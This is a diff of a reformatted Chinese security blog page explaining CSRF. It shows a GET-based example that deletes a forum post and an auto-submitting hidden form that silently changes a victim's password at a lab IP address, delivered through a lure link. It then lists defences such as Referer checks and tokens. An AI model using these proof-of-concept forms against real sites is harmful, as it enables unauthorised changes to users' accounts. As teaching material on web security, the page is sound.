@@ -1,112 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>CSRF 漏洞 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>CSRF 漏洞</h1>
-      
-<div class="post-meta">
-    <time>2016-06-28</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/csrf">csrf</a>)
-</div>
-
-      <div><h3 id="0x00-概念">0x00 概念</h3>
-<p>当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。</p>
-<p>CSRF就是：攻击者通过一些技术手段欺骗用户的<font color="FF0000">浏览器</font>去<font color="FF0000">访问</font>一个自己曾<font color="FF0000">认证过</font>的网站并<font color="FF0000">执行某些操作</font>。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作</p>
-<h3 id="0x01-利用">0x01 利用</h3>
-<ul>
-<li>
-<p>利用条件</p>
-<ul>
-<li>攻击者可以得知url的所有参数项并了解其含义</li>
-<li>诱导用户访问构造好的POC</li>
-</ul>
-</li>
-<li>
-<p>利用地方</p>
-<ul>
-<li>操作是有意义的(比如:修改密码等)</li>
-<li>验证过于简单(参数固定、我们可以设置参数)</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x02-get型csrf攻击">0x02 GET型CSRF攻击</h3>
-<pre tabindex="0"><code>若有论坛www.aa.com，论坛删除文章的操作是请求类似
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>CSRF 漏洞 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>CSRF 漏洞</h1><div class=post-meta><time>2016-06-28</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/csrf>csrf</a>)</div><div><h3 id=0x00-概念>0x00 概念</h3><p>当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。</p><p>CSRF就是：攻击者通过一些技术手段欺骗用户的<font color=FF0000>浏览器</font>去<font color=FF0000>访问</font>一个自己曾<font color=FF0000>认证过</font>的网站并<font color=FF0000>执行某些操作</font>。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作</p><h3 id=0x01-利用>0x01 利用</h3><ul><li><p>利用条件</p><ul><li>攻击者可以得知url的所有参数项并了解其含义</li><li>诱导用户访问构造好的POC</li></ul></li><li><p>利用地方</p><ul><li>操作是有意义的(比如:修改密码等)</li><li>验证过于简单(参数固定、我们可以设置参数)</li></ul></li></ul><h3 id=0x02-get型csrf攻击>0x02 GET型CSRF攻击</h3><pre tabindex=0><code>若有论坛www.aa.com，论坛删除文章的操作是请求类似
 http://www.aa.com/opt.php?id=135&amp;act=del&amp;name=Tom的链接
-</code></pre><pre tabindex="0"><code>有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任
-</code></pre><pre tabindex="0"><code>此时有hacker用户B，他构造了一个html为b.html，b.html内容如下：
+</code></pre><pre tabindex=0><code>有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任
+</code></pre><pre tabindex=0><code>此时有hacker用户B，他构造了一个html为b.html，b.html内容如下：
 &lt;html&gt;
 &lt;head&gt;
     &lt;title&gt;test&lt;/title&gt;
@@ -116,85 +23,45 @@ http://www.aa.com/opt.php?id=135&amp;act=del&amp;name=Tom的链接
 &lt;/body&gt;
 &lt;/html&gt;
 将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html
-</code></pre><pre tabindex="0"><code>恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A，
+</code></pre><pre tabindex=0><code>恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A，
 诱使他访问，用户A一旦访问，他id为251的文章就会被删除
-</code></pre><h3 id="0x03-post型csrf攻击">0x03 POST型CSRF攻击</h3>
-<p>若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图：
-<img src="/img/post/csrf_post.png" alt="csrf_post利用"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;aa&lt;/<span style="color:#f92672">title</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://172.23.10.200/setpasswd.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        昵称：&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nickname&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nickname&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxxxx&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        用户名：&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xiaoming&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        密码：&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;passwd&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;passwd&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;passwd&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        确认密码：&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rpasswd&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rpasswd&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rpasswd&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;提交&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
-</span></span></code></pre></div><p>此时我们就可以构造自动提交表单的xxxx.html，内容如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;aa&lt;/<span style="color:#f92672">title</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://172.23.10.200/setpasswd.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;passwd&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;passwd&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;666666&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rpasswd&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rpasswd&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;666666&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#e6db74">&#34;document.csrf.submit()&#34;</span>,<span style="color:#ae81ff">100</span>);
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
-</span></span></code></pre></div><p>然后将连接<code>http://www.bb.com/xxxx.html</code> 发送给用户,诱使他点击链接,一旦他点击,则密码就会被修改</p>
-<h3 id="0x04-防御">0x04 防御：</h3>
-<ul>
-<li>验证Referer</li>
-<li>对于修改密码的表单可以要求输入原密码</li>
-<li>二次确认(如删除用户、转账等重要操作弹窗要求用户确认)</li>
-<li>Token认证
-<ul>
-<li>GET操作请求：可以在Cookie中存储Token</li>
-<li>POST操作请求：可以在form表单中添加一个隐藏的input标签，value值为Token</li>
-<li>在header中添加自定义参数携带token</li>
-</ul>
-</li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x03-post型csrf攻击>0x03 POST型CSRF攻击</h3><p>若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图：
+<img src=/img/post/csrf_post.png alt=csrf_post利用></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>title</span>&gt;aa&lt;/<span style=color:#f92672>title</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://172.23.10.200/setpasswd.php&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span>&gt;
+</span></span><span style=display:flex><span>        昵称：&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;nickname&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;nickname&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;xxxxx&#34;</span>&gt;
+</span></span><span style=display:flex><span>        用户名：&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;name&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;name&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;xiaoming&#34;</span>&gt;
+</span></span><span style=display:flex><span>        密码：&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;passwd&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;passwd&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;passwd&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>&gt;
+</span></span><span style=display:flex><span>        确认密码：&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;rpasswd&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;rpasswd&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;rpasswd&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;button&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;提交&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>form</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span></code></pre></div><p>此时我们就可以构造自动提交表单的xxxx.html，内容如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>title</span>&gt;aa&lt;/<span style=color:#f92672>title</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;csrf&#34;</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://172.23.10.200/setpasswd.php&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hidden&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;passwd&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;passwd&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;666666&#34;</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hidden&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;rpasswd&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;rpasswd&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;666666&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>form</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>script</span>&gt;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>setTimeout</span>(<span style=color:#e6db74>&#34;document.csrf.submit()&#34;</span>,<span style=color:#ae81ff>100</span>);
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>script</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span></code></pre></div><p>然后将连接<code>http://www.bb.com/xxxx.html</code> 发送给用户,诱使他点击链接,一旦他点击,则密码就会被修改</p><h3 id=0x04-防御>0x04 防御：</h3><ul><li>验证Referer</li><li>对于修改密码的表单可以要求输入原密码</li><li>二次确认(如删除用户、转账等重要操作弹窗要求用户确认)</li><li>Token认证<ul><li>GET操作请求：可以在Cookie中存储Token</li><li>POST操作请求：可以在form表单中添加一个隐藏的input标签，value值为Token</li><li>在header中添加自定义参数携带token</li></ul></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
